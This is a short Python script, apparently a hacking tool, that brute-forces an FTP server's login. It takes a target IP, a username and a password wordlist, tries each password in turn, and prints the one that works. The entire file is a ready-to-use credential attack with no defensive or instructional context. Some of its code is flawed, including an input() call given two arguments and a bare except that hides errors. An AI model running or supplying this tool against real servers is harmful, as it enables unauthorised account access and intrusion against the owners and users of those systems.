import ftplib as f
import os, time, socket
from termcolor import colored as c
from datetime import datetime as d

host = input(c("HOST IP : ", "red"))
try:
    socket.inet_aton(host)
except socket.error:
    print(c("IP INVALID !", "red"), c("\nABORTING !!!", "yellow"))
    quit()
user = input(c("USERNAME : ", "red"))
default = input(c("USE DEFAULT FTP PORT ?", "red"), c("[Y/N] :", "yellow")).lower()
if default == "y":
    port = 21
elif default == "n":
    port = input(c("PORT NUMBER : ", "red"))
else:
    print(c("WRONG INPUT !", "red"), c("\nUSING DEFAULT PORT 21", "yellow"))
    port = 21
wordlist = input(c("WORDLIST FILE : ", "green"))
# If wordlist doesnt exist aborts
if not os.path.isfile(wordlist):
    print(c("WORDLIST DOESNT EXIST !", "red"))
    print(c("ABORTING !!!", "yellow"))
    quit()
counts = len(list(open(wordlist, "r").readlines()))


def brute(passwords):
    print(c("STARTED BRUTE FORCING :", "red"), c(host, "green"), c(d.now().strftime("(%d/%m/%Y - %H:%M:%S)"), "blue"))
    time.sleep(1.5)
    server = f.FTP()
    with open(wordlist, "r") as file:
        print(c("WORDLIST LOADED SUCCESSFULLY :", "red"), c(wordlist, "green"))
        time.sleep(1.5)
        print(c("NUMBER OF TRIES AHEAD :", "red"), c(counts, "green"))
        for line in file.readlines():
            for passwd in line.split():
                try:
                    server.connect(host, port, timeout=5)
                    server.login(user, passwd)
                    print(c("PASSWORD FOUND :", "red"), c(d.now().strftime("(%d/%m/%Y - %H:%M:%S)"), "blue"))
                    print(c("HOST IP :", "red"), c(host, "green"), c("PORT IP :", "red"), c(port, "green"))
                    print(c("PASSWORD :", "red"), c(passwd, "green"))
                    return True
                except:
                    continue
    return False


if not brute(wordlist):
    print(c("NO MATCHING PASSWORD ON THE WORDLIST :", "red"), c(wordlist, "green"))
    time.sleep(1)
    print(c("PLEASE TRY ANOTHER WORDLIST !", "yellow"))
    quit()